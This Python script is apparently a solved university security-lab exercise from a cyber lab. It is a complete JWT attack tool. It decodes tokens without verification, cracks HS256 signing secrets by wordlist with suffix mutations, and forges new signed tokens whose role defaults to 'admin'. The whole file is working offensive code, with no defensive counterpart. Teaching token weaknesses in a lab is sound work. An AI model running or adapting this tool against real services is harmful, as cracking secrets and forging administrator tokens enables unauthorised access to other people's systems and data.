#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Fernando Boiero — CyberLab UTN FRVM
"""jwt_tool.py — Lab Extra 5 (resuelto, grupo 14). Solo biblioteca estándar."""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import time


def b64url_dec(texto: str) -> bytes:
    pad = "=" * (-len(texto) % 4)
    return base64.urlsafe_b64decode(texto + pad)


def b64url(datos: bytes) -> str:
    return base64.urlsafe_b64encode(datos).rstrip(b"=").decode()


def decodificar(token: str) -> tuple:
    """(header, payload, firma_hex) SIN verificar nada."""
    cab, pay, fir = token.split(".")
    header = json.loads(b64url_dec(cab))
    payload = json.loads(b64url_dec(pay))
    firma_hex = b64url_dec(fir).hex()
    return header, payload, firma_hex


def firma_es_valida(token: str, secreto: bytes) -> bool:
    cab, pay, fir = token.split(".")
    esperada = b64url(hmac.new(secreto, f"{cab}.{pay}".encode(),
                               hashlib.sha256).digest())
    return hmac.compare_digest(fir, esperada)


def aplicar_reglas(palabra: str) -> list:
    out = [palabra, palabra.capitalize()]
    for base in (palabra, palabra.capitalize()):
        for suf in ("123", "2025", "2026", "1", "!"):
            out.append(base + suf)
    vistos, dedup = set(), []
    for v in out:
        if v not in vistos:
            vistos.add(v); dedup.append(v)
    return dedup


def crackear_secreto(token: str, diccionario: str) -> str:
    with open(diccionario) as fh:
        for linea in fh:
            lemma = linea.strip()
            if not lemma:
                continue
            for cand in aplicar_reglas(lemma):
                if firma_es_valida(token, cand.encode()):
                    return cand
    return ""


def forjar(secreto: bytes, sub: str, role: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    ahora = int(time.time())
    payload = {"sub": sub, "role": role, "iat": ahora, "exp": ahora + 3600}
    partes = b64url(json.dumps(header, separators=(",", ":")).encode()) + "." \
           + b64url(json.dumps(payload, separators=(",", ":")).encode())
    firma = hmac.new(secreto, partes.encode(), hashlib.sha256).digest()
    return partes + "." + b64url(firma)


def main() -> int:
    ap = argparse.ArgumentParser(description="jwt_tool — Lab Extra 5")
    sub = ap.add_subparsers(dest="cmd", required=True)
    d = sub.add_parser("decodificar"); d.add_argument("token")
    c = sub.add_parser("crackear"); c.add_argument("token"); c.add_argument("diccionario")
    f = sub.add_parser("forjar"); f.add_argument("secreto")
    f.add_argument("--sub", default="diego"); f.add_argument("--role", default="admin")
    args = ap.parse_args()

    if args.cmd == "decodificar":
        header, payload, firma = decodificar(args.token)
        print("HEADER: ", json.dumps(header, indent=2))
        print("PAYLOAD:", json.dumps(payload, indent=2))
        print("FIRMA:  ", firma[:32] + "…")
    elif args.cmd == "crackear":
        secreto = crackear_secreto(args.token, args.diccionario)
        print(f"SECRETO: {secreto}" if secreto else "No cayó con ese diccionario.")
    else:
        print(forjar(args.secreto.encode(), args.sub, args.role))
    return 0


if __name__ == "__main__":
    sys.exit(main())
